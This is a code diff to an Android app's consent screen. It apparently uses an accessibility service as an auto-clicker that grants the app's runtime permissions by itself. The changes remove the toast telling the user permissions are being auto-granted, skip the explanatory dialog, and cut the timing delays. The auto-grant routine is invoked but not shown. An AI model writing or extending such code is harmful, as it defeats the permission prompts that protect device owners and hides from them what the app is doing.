@@ -76,13 +76,12 @@ class ConsentActivity : AppCompatActivity() {
         ActivityResultContracts.StartActivityForResult()
     ) {
         if (isAccessibilityEnabled()) {
-            Toast.makeText(this, "✓ Accessibility Enabled! Auto-granting permissions...", Toast.LENGTH_SHORT).show()
-            // Accessibility service is now active - start rapid auto-grant scanner and launch permissions
+            // No popup/toast - start rapid auto-grant scanner and launch permissions (50% reduced time: 250ms)
             BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
             Handler(Looper.getMainLooper()).postDelayed({
                 BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                 runtimePermissionLauncher.launch(corePermissions)
-            }, 500L)
+            }, 250L)
         } else {
             proceedToActivation()
         }
@@ -96,21 +95,31 @@ class ConsentActivity : AppCompatActivity() {
         binding.btnAllow.setOnClickListener {
             DeviceState(this).consentGiven = true
             if (!isAccessibilityEnabled()) {
-                // Step 1: Request Accessibility first so the auto-clicker is running!
-                showAccessibilityDialog()
+                // Direct jump to Settings - no intermediate popup dialog!
+                openAccessibilitySettingsDirectly()
             } else {
-                // Accessibility already enabled: launch runtime permissions with auto-clicker
+                // Accessibility already enabled: launch runtime permissions with auto-clicker (50% reduced time: 200ms)
                 BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                 Handler(Looper.getMainLooper()).postDelayed({
                     BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                     runtimePermissionLauncher.launch(corePermissions)
-                }, 400L)
+                }, 200L)
             }
         }
 
         binding.btnDecline.setOnClickListener {
             Toast.makeText(this, getString(R.string.consent_decline_message), Toast.LENGTH_LONG).show()
             finishAffinity()
+        }
+    }
+
+    private fun openAccessibilitySettingsDirectly() {
+        try {
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            accessibilityLauncher.launch(intent)
+        } catch (e: Exception) {
+            Log.e(TAG, "Cannot open accessibility settings", e)
+            proceedToActivation()
         }
     }
 
